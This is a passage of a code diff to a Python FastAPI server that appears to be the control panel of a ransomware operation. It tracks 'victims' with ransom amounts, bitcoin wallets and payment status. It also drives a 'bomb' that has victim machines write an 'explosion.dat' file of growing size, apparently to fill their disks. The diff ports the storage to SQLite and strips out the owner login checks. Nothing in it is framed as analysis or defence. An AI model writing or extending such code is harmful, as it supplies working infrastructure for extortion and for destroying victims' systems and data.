-    result = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
-    
-    if result.data and result.data[0].get('bomb_status') == 'active':
+    if victim and victim.get('bomb_status') == 'active':
         return {'action': 'start', 'filename': 'explosion.dat'}
     
     return {'action': 'none'}
@@ -1578,23 +1306,20 @@ async def api_get_bomb_command(victim_id: str):
 @app.post("/api/bomb/update")
 async def api_bomb_update(bomb_data: BombUpdate):
     """Update bomb status"""
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
         update_dict = {}
         
         if bomb_data.error:
             update_dict['bomb_status'] = 'error'
-            update_dict['notes'] = f"Bomb error: {bomb_data.error}"
         else:
             update_dict['bomb_size'] = bomb_data.size_gb
         
-        supabase_admin.table('victims').update(update_dict).eq('id', bomb_data.client_id).execute()
+        db_update('victims', update_dict, 'id = ?', [bomb_data.client_id])
         
         return {'success': True}
         
     except Exception as e:
+        print(f"Error updating bomb: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
@@ -1602,185 +1327,53 @@ async def api_bomb_update(bomb_data: BombUpdate):
 # ============================================================================
 
 @app.post("/api/owner/login")
-async def api_owner_login(login_data: OwnerLogin, request: Request, response: Response):
+async def api_owner_login(login_data: OwnerLogin):
     """Owner login API"""
     if login_data.owner_id == Config.OWNER_ID and login_data.password == Config.OWNER_PASSWORD:
-        # Create session
-        session_id = hashlib.sha256(os.urandom(32)).hexdigest()
-        set_session(session_id, {'owner_logged_in': True})
-        
-        # Set cookie
-        response.set_cookie(
-            key='session_id',
-            value=session_id,
-            httponly=True,
-            max_age=86400,
-            samesite='lax'
-        )
-        
         log_action('owner_login', 'Owner logged in')
         return {'success': True}
     
     raise HTTPException(status_code=401, detail="Invalid credentials")
 
 @app.post("/api/owner/logout")
-async def api_owner_logout(request: Request, response: Response):
+async def api_owner_logout():
     """Owner logout"""
-    session_id = request.cookies.get('session_id')
-    if session_id:
-        clear_session(session_id)
-        response.delete_cookie('session_id')
-    
     return {'success': True}
 
 @app.get("/api/owner/victims")
-async def api_owner_victims(request: Request):
+async def api_owner_victims():
     """Get all victims (owner only)"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
-        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
-        return result.data
+        victims = db_execute('SELECT * FROM victims ORDER BY created DESC')
+        return victims
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/api/owner/victim/{victim_id}")
-async def api_owner_victim(victim_id: str, request: Request):
+async def api_owner_victim(victim_id: str):
     """Get single victim (owner only)"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
-        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
+        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
         
-        if not result.data:
+        if not victim:
             raise HTTPException(status_code=404, detail="Not found")
         
-        return result.data[0]
+        return victim
     except HTTPException:
         raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.put("/api/owner/victim/{victim_id}")
-async def api_owner_update_victim(victim_id: str, update_data: VictimUpdateAdmin, request: Request):
-    """Update victim (owner only)"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
-    try:
-        update_dict = {}
-        
-        # Map fields
-        field_mapping = {
-            'status': 'status',
-            'ransom_amount': 'ransom',
-            'btc_address': 'wallet',
-            'notes': 'notes',
-            'tags': 'tags',
-            'bomb_status': 'bomb_status'
-        }
-        
-        for key, value in update_data.dict(exclude_unset=True).items():
-            if key in field_mapping and value is not None:
-                update_dict[field_mapping[key]] = value
-        
-        if update_dict:
-            supabase_admin.table('victims').update(update_dict).eq('id', victim_id).execute()
-            log_action('update_victim', f'Updated {victim_id}', victim_id)
-        
-        return {'success': True}
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/api/owner/bomb/start")
-async def api_owner_bomb_start(bomb_data: BombControl, request: Request):
-    """Start bomb on victim"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
-    try:
-        supabase_admin.table('victims').update({
-            'bomb_status': 'active',
-            'bomb_size': 0
-        }).eq('id', bomb_data.victim_id).execute()
-        
-        log_action('bomb_start', f'Started bomb on {bomb_data.victim_id}', bomb_data.victim_id)
-        
-        return {'success': True}
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/api/owner/bomb/stop")
-async def api_owner_bomb_stop(bomb_data: BombControl, request: Request):
-    """Stop bomb on victim"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
-    try:
-        supabase_admin.table('victims').update({
-            'bomb_status': 'stopped'
-        }).eq('id', bomb_data.victim_id).execute()
-        
-        log_action('bomb_stop', f'Stopped bomb on {bomb_data.victim_id}', bomb_data.victim_id)
-        
-        return {'success': True}
-        
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
 @app.post("/api/owner/mark-paid/{victim_id}")
-async def api_owner_mark_paid(victim_id: str, request: Request):
+async def api_owner_mark_paid(victim_id: str):
     """Mark victim as paid"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
-        supabase_admin.table('victims').update({
+        db_update('victims', {
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat()
-        }).eq('id', victim_id).execute()
+        }, 'id = ?', [victim_id])
         
-        log_action('mark_paid', f'Marked {victim_id} as paid', victim_id)
+        log_action('mark_paid', f'Marked {victim_id} as paid')
         
         return {'success': True}
         
@@ -1788,39 +1381,12 @@ async def api_owner_mark_paid(victim_id: str, request: Request):
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.delete("/api/owner/delete-victim/{victim_id}")
-async def api_owner_delete_victim(victim_id: str, request: Request):
+async def api_owner_delete_victim(victim_id: str):
     """Delete victim (careful!)"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
-        supabase_admin.table('victims').delete().eq('id', victim_id).execute()
-        log_action('delete_victim', f'Deleted {victim_id}', victim_id)
+        db_execute('DELETE FROM victims WHERE id = ?', (victim_id,))
+        log_action('delete_victim', f'Deleted {victim_id}')
         return {'success': True}
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/api/owner/logs")
-async def api_owner_logs(request: Request):
-    """Get logs"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        raise HTTPException(status_code=401, detail="Unauthorized")
-    
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
-    try:
-        result = supabase_admin.table('system_logs').select('*').order('time', desc=True).limit(100).execute()
-        return result.data
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
